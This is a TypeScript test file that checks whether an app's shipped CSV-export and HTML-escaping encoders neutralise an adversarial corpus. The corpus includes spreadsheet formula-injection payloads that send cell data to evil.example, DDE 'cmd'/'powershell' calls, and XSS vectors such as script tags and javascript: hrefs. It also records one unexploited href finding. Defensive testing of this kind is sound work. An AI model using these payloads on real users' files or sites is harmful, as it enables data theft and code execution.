/**
 * SEC-12x — the encoders that actually ship, as opposed to A10's reference ones.
 *
 * Pass one proved `tests/security/helpers/*.ts`. That proved a design, not a product.
 * These cases run the SAME adversarial corpus through the code that is deployed:
 * A09's `apps/app/src/privacy/csv.ts` and A05's `packages/ui/src/html.ts`.
 *
 * The differential form matters. If the shipped encoder and the reviewed reference ever
 * disagree on a byte, one of them is wrong and the SEC-1xx/SEC-2xx cases stop meaning
 * anything about production.
 */
import { describe, it, expect } from 'vitest';
import { csvCell as shippedCsvCell, csvRow as shippedCsvRow, csvDocument } from '@app/privacy/csv';
import { csvCell as referenceCsvCell } from '../helpers/csv.js';
import { escapeHtml, safeHref } from '../helpers/html.js';
import { attrs, escapeAttribute, render } from '@verify/ui';
import { html } from 'hono/html';

/** Every payload the reference suite uses, plus the ones exports specifically attract. */
const CSV_CORPUS: readonly (string | number | null | undefined)[] = [
  '=IMPORTXML("https://evil.example/?d="&A1,"//x")',
  '=HYPERLINK("https://evil.example/?"&A1,"Click for refund")',
  '=WEBSERVICE("https://evil.example/?d="&A1)',
  "=cmd|'/c calc'!A0",
  "@SUM(1+1)*cmd|'/c powershell -e ...'!A0",
  '+1+1',
  "-2+3+cmd|'/c calc'!A0",
  '\tTAB leader',
  '\rCR leader',
  '=CONCAT("a","b")',
  'say "hi"',
  'a,b',
  'line1\nline2',
  'line1\r\nline2',
  '"=cmd"',
  'VERIFIED',
  'run_01HZ',
  '-2900',
  '',
  2900,
  0,
  null,
  undefined,
];

describe('A09 export writer vs the reviewed reference', () => {
  it('SEC-1201 the shipped csvCell agrees with the reference on every corpus value', () => {
    const disagreements: string[] = [];
    for (const value of CSV_CORPUS) {
      const shipped = shippedCsvCell(value as never);
      const reference = referenceCsvCell(value ?? null);
      if (shipped !== reference) {
        disagreements.push(`${JSON.stringify(value)}: shipped=${JSON.stringify(shipped)} reference=${JSON.stringify(reference)}`);
      }
    }
    expect(disagreements).toEqual([]);
  });

  it('SEC-1202 the apostrophe lands INSIDE the quotes, which is the whole point', () => {
    // Quote first and the apostrophe sits outside, where Excel ignores it and evaluates the
    // formula in a row that is also malformed. This is the case the split between A02's
    // prefixer and A09's quoter existed to break.
    const out = shippedCsvCell('=CONCAT("a","b")');
    expect(out.startsWith('"\'=')).toBe(true);
    expect(out.endsWith('"')).toBe(true);
    expect(out).not.toMatch(/^'"/);
  });

  it('SEC-1203 every formula leader is neutralised by the shipped encoder', () => {
    for (const leader of ['=', '+', '-', '@', '\t', '\r']) {
      const out = shippedCsvCell(`${leader}payload`);
      const unquoted = out.startsWith('"') ? out.slice(1) : out;
      expect(unquoted.startsWith("'"), JSON.stringify(leader)).toBe(true);
    }
  });

  it('SEC-1204 a hostile CRM value cannot break out of its field into a new record', () => {
    const hostile = '=cmd|\'/c calc\'!A0\r\nattacker,row,injected';
    const row = shippedCsvRow(['run_1', 'FAILED', hostile, 'ok']);
    // The whole hostile value must remain one quoted field: exactly three commas at the
    // top level, and no bare CRLF outside quotes.
    expect(row.split('"').length % 2, 'unbalanced quoting').toBe(1);
    const doc = csvDocument([['a', hostile], ['b', 'c']]);
    // Two records plus the trailing terminator — the injected CRLF stays inside the field.
    expect(doc.split(/\r\n(?=(?:[^"]*"[^"]*")*[^"]*$)/).filter((p) => p.length > 0).length).toBe(2);
  });

  it('SEC-1205 null and undefined become an empty field, never the word "null"', () => {
    expect(shippedCsvCell(null)).toBe('');
    expect(shippedCsvCell(undefined)).toBe('');
    expect(shippedCsvCell('')).toBe('');
  });
});

describe('A05 UI escaping vs the reviewed reference', () => {
  const XSS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    "'><iframe srcdoc='<script>alert(1)</script>'>",
    '<details open ontoggle=alert(1)>',
    '</textarea><script>alert(1)</script>',
  ];

  it('SEC-1210 hono/html escapes an interpolated workflow name so no tag survives', async () => {
    for (const payload of XSS) {
      const out = await render(html`<h1>${payload}</h1>`);
      expect(out, payload).not.toMatch(/<(script|img|svg|iframe|details)\b/i);
      expect(out, payload).toContain('&lt;');
    }
  });

  it('SEC-1211 escapeAttribute prevents breakout from a double-quoted attribute', () => {
    for (const payload of XSS) {
      const out = escapeAttribute(payload);
      expect(out, payload).not.toContain('"');
      expect(out, payload).not.toContain('<');
      expect(out, payload).not.toContain('>');
    }
  });

  it('SEC-1212 attrs() refuses an attribute NAME assembled from input', () => {
    // An escaped value in a sane attribute is safe; an attribute whose *name* came from
    // customer input is `onerror` waiting to happen. It must throw, not sanitise.
    expect(() => attrs({ 'onerror=alert(1) x': 'y' })).toThrow(TypeError);
    expect(() => attrs({ 'data-ok': 'value' })).not.toThrow();
  });

  it('SEC-1213 A05 and A10 agree on the five characters that must never survive', () => {
    // A10's reference also escapes backtick and `=`, which matters only for UNQUOTED
    // attributes. A05 always quotes, so the difference is safe — but the five that matter
    // in every context must match exactly, and this pins that.
    for (const ch of ['&', '<', '>', '"', "'"]) {
      expect(escapeAttribute(ch), ch).toBe(escapeHtml(ch));
    }
  });

  it('SEC-1214 FINDING: the UI has no scheme guard for an href it did not author', async () => {
    // `button.ts` and `navigation.ts` interpolate `options.href` / `item.href` straight
    // into `href="${...}"`. hono/html escapes the quotes, so there is no attribute
    // breakout — but `javascript:alert(1)` survives intact as a working link target.
    //
    // NOT EXPLOITABLE TODAY, for two independent reasons: every href in the shipped code
    // is a literal from `layouts.ts`, and the deployed CSP (`script-src` with hashes, no
    // `unsafe-inline`) blocks `javascript:` navigation. It becomes live the moment a link
    // target comes from a CRM value, a report link, a campaign destination or a support
    // message — and it stops being mitigated if the CSP is ever loosened.
    //
    // FIX (A05): route every non-literal href through a scheme allowlist. A10's
    // `safeHref` in `tests/security/helpers/html.ts` is the reviewed reference; the
    // useful shape is a `Url` branded type that only the guard can produce, so an
    // unguarded string cannot reach an `href` at all.
    const rendered = await render(html`<a href="${'javascript:alert(1)'}">click</a>`);
    expect(
      rendered,
      'a javascript: URL reached an href attribute intact',
    ).not.toContain('javascript:alert(1)');
  });

  it('SEC-1215 the reference guard rejects what the UI currently lets through', () => {
    // Kept alongside SEC-1214 so the fix has something to be tested against.
    for (const bad of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'data:text/html,<script>1</script>', 'vbscript:msgbox(1)']) {
      expect(safeHref(bad), bad).toBeNull();
    }
    expect(safeHref('/app/runs/run_1')).toBe('/app/runs/run_1');
    expect(safeHref('https://example.test/a')).toContain('https://example.test/a');
  });
});
